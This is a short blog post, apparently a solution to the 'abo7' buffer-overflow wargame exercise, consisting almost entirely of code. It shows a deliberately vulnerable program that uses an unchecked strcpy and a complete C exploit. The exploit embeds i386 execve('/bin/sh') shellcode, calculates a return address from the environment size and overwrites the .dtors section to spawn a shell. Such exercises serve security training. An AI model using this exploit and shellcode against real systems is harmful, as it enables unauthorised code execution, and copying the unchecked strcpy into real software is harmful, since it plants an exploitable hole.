---
layout: post
title: "abo7.c solution"
description: ""
category: 
tags: []
---
{% include JB/setup %}

vul.c
---

	char buf[256]={1};

	int main(int argv,char **argc) {
		strcpy(buf,argc[1]);
	}

exp.c
---
	#include <stdio.h>
	#include <string.h>
	#include <unistd.h>
	#include <stdlib.h>

	#define BUF 	477	// 119*4 + 1 (offset for .dtors section)

	char sc[] = /* linux/i386 shellcode */
	"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

	int main(int argc, char *argv[])
	{
	    char dotname[128];
	    sprintf(dotname,"./%s",argv[1]);
	    printf("%s\n",dotname);
		char buf[BUF];
		int i, ret;

		/* address pointer */
		int *ap = (int *)(buf);

		/* user environment */
		extern char **environ;
		char **ep;
		int env_size = 0;

		ep = environ;
		while (*ep) {
			env_size += strlen(*ep);
			ep++;
			env_size++;
		}

		/* calculate the ret address */
		ret = 0xbffffffa - strlen(sc) - strlen(dotname) - env_size;

		fprintf(stderr, "Using env size: %d\n", env_size);
		fprintf(stderr, "Using offset for .dtors: %d\n", BUF);
		fprintf(stderr, "Using ret: 0x%X\n", ret);

		/* prepare buf for the overflow with the ret address */
		for (i = 0; i < BUF - 1; i += 4)
			*ap++ = ret;
		*ap = 0x0;

		/* run the vulnerable program */
		execl(dotname, argv[1], buf, sc, NULL);
		perror("execl");
	}
